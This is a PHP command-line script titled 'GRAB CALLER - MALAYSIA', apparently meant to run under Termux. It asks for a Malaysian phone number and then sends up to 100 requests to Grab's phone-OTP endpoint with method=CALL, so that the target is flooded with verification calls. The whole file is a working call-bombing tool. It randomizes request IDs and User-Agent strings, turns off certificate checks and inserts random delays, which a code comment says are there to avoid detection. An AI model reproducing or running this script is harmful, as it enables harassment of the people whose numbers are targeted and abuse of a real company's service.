<?php

class GrabCaller {
    private $number;
    
    private function correct($number) {
        // Clean the number
        $number = preg_replace('/[^0-9]/', '', $number);
        
        // Convert Malaysian format
        if (substr($number, 0, 2) == "60") {
            return $number;
        } elseif (substr($number, 0, 1) == "0") {
            return "60" . substr($number, 1);
        } elseif (substr($number, 0, 3) == "601") {
            return $number;
        } else {
            return "60" . $number;
        }
    }
    
    private function randStr($length) {
        $characters = '0123456789abcdef';
        $randStr = '';
        for ($i = 0; $i < $length; $i++) {
            $randStr .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randStr;
    }
    
    private function loop($many, $sleep = null) {
        $a = 0;
        $no = $this->correct($this->number);
        $success = 0;
        $failed = 0;
        
        echo "[+] Target: $no\n";
        echo "[+] Total calls: $many\n";
        echo "[+] Starting attack...\n\n";
        
        while ($a < $many) {
            $rand = rand(123456, 9999999);
            $rands = $this->randStr(12);
            $post = "method=CALL&countryCode=my&phoneNumber=$no&templateID=pax_android_production";
            $h = array();
            $h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
            $h[] = "Accept-Language: ms-MY;q=1.0, en-us;q=0.9, en;q=0.8";
            $h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
            $h[] = "Content-Type: application/x-www-form-urlencoded";
            $h[] = "Content-Length: " . strlen($post);
            $h[] = "Host: api.grab.com";
            $h[] = "Connection: close";
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            $a++;
            
            if ($httpCode == 200 || $httpCode == 204) {
                $success++;
                echo "[$a/$many] ✅ Call sent successfully\n";
            } else {
                $failed++;
                echo "[$a/$many] ❌ Failed (HTTP: $httpCode)\n";
            }
            
            if ($sleep !== null && $a < $many) {
                sleep($sleep);
            }
            
            // Random delay between 2-5 seconds to avoid detection
            if ($sleep === null && $a < $many) {
                sleep(rand(2, 5));
            }
        }
        
        echo "\n[+] ========== FINISHED ==========\n";
        echo "[+] Total: $many\n";
        echo "[+] Successful: $success\n";
        echo "[+] Failed: $failed\n";
        echo "[+] ===============================\n";
    }
    
    public function run() {
        echo "\n╔════════════════════════════════╗\n";
        echo "║     GRAB CALLER - MALAYSIA     ║\n";
        echo "║        Termux Version          ║\n";
        echo "╚════════════════════════════════╝\n\n";
        
        // Get phone number
        while (true) {
            echo "Enter Malaysian number (e.g., 0123456789 or +60123456789): ";
            $input = trim(fgets(STDIN));
            
            // Clean number
            $clean = preg_replace('/[^0-9]/', '', $input);
            
            if (strlen($clean) >= 9 && strlen($clean) <= 11) {
                $this->number = $clean;
                break;
            } else {
                echo "❌ Invalid number! Please enter a valid Malaysian number.\n\n";
            }
        }
        
        // Get number of calls
        while (true) {
            echo "How many calls? (Max: 100): ";
            $many = trim(fgets(STDIN));
            
            if (is_numeric($many) && $many > 0 && $many <= 100) {
                break;
            } else {
                echo "❌ Please enter a number between 1-100\n";
            }
        }
        
        // Optional delay
        echo "Add delay between calls? (0 = random delay, or seconds): ";
        $sleep = trim(fgets(STDIN));
        
        if (is_numeric($sleep) && $sleep > 0) {
            $this->loop($many, $sleep);
        } else {
            $this->loop($many);
        }
    }
}

// Clear screen for better display
system('clear');

// Check if curl is installed
if (!function_exists('curl_init')) {
    echo "❌ PHP CURL is not installed!\n";
    echo "Install it with: pkg install php-curl\n";
    exit;
}

// Run the script
try {
    $caller = new GrabCaller();
    $caller->run();
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}
